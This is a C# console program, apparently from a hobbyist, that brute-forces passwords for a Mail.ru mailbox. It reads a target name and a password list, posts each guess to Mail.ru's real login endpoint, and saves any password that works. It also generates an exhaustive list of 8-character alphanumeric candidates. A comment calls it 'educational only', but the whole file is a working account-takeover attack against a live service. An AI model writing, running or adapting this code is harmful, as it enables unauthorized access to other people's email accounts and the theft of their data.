using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.IO;
using System.Linq.Expressions;
using xNet;
using System.Threading;

namespace MailRuParser
{
    class Program                                              //данный парсер используется ИСКЛЮЧИТЕЛЬНО в образовательных целях
    {
        static void Main(string[] args)
        {
            bool pass = false;
            Console.Write("Введите имя ящика: ");
            string name = Console.ReadLine();
            Console.Write("Введите полный путь до базы паролей: ");
            string address = Console.ReadLine();
            Console.Write("Укажите адрес папки,куда нужно сохранить пароль: ");
            string passaddress = Console.ReadLine() + "/Пароль.txt";
            List<string> passwords = new List<string>();     // создаем массив паролей
            using(var sr = new StreamReader(address))
            {
                do
                 {
                   passwords.Add(sr.ReadLine());                        // заполняем массив пароялми из базы
                 } while (passwords[passwords.Count - 1] != null);
            }
            for (int i = 0;i<passwords.Count - 1;i++) { 
                HttpRequest request = new HttpRequest();

                request.Cookies = new CookieDictionary();
                request.KeepAlive = true;
                request.UserAgent = Http.ChromeUserAgent();
                //request.Proxy = ProxyClient.Parse(ProxyType.Http, "219.166.7.50");
                request.AddHeader("Referer", "https://my.mail.ru/?fail=1");                  //заполняем куки


                RequestParams reqParams = new RequestParams();                        //заполняем параметры
                reqParams["Login"] = name;
                reqParams["Password"] = passwords[i];
                reqParams["page"] = "https://my.mail.ru/?fail=1";
                reqParams["FailPage"] = "https://my.mail.ru/cgi-bin/login?fail=1";

                Console.WriteLine(passwords[i]);

                string response = request.Post("https://auth.mail.ru/cgi-bin/auth", reqParams, true).ToString();    //копируем страницу mail.ru после отправленного запроса

                response = response.Replace("<!DOCTYPE html>", "");                  //очищаем от мусора(понять,получилось ли войти можно по первой строке)
                response = response.Remove(response.IndexOf(">"));
                if (response.IndexOf("unauthorised-user") == -1)                     //проверяем наличие кодового слова при неудачном входе,и если оно отсутствует
                {                                                                    //то создаем текстовый файл с паролем и прекращаем подбор
                    using (var sw = new StreamWriter(passaddress, true))             //тут нужно ввести адрес папки,куда нужно сохранить файл с паролем
                    {
                        sw.WriteLine(passwords[i]);
                        pass = true;
                    }
                    break;
                }
            }
            if (!pass)                                                               //если ни один из паролей не подошел,сообщаем пользователю
            {
                Console.WriteLine("Ни один из паролей из базы не подошел у указанному ящику");
                FileStream baza = new FileStream("baza.txt", FileMode.Create, FileAccess.Write);
                StreamWriter sw = new StreamWriter(baza);
                string symb = "abcdefghigklmnopqrstuvwxyzABCDEFGHIGKLMNOPQRSTUVWXYZ0123456789";
                for (int a = 0;a<symb.Length;a++)
                {
                    for (int b = 0;b <symb.Length;b++)
                    {
                        for (int c = 0; c< symb.Length;c++)
                        {
                            for (int d = 0; d < symb.Length; d++)
                            {
                                for (int e = 0; e < symb.Length; e++)
                                {
                                    for (int f = 0; f< symb.Length;f++)
                                    {
                                        for (int g = 0; g< symb.Length;g++)
                                        {
                                            for (int h = 0; h < symb.Length; h++)
                                            {
                                                string passparse = symb[a].ToString() + symb[b].ToString() + symb[c].ToString() + symb[d].ToString() + symb[e].ToString() + symb[f].ToString() + symb[g].ToString() + symb[h].ToString();
                                                sw.WriteLine(passparse);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
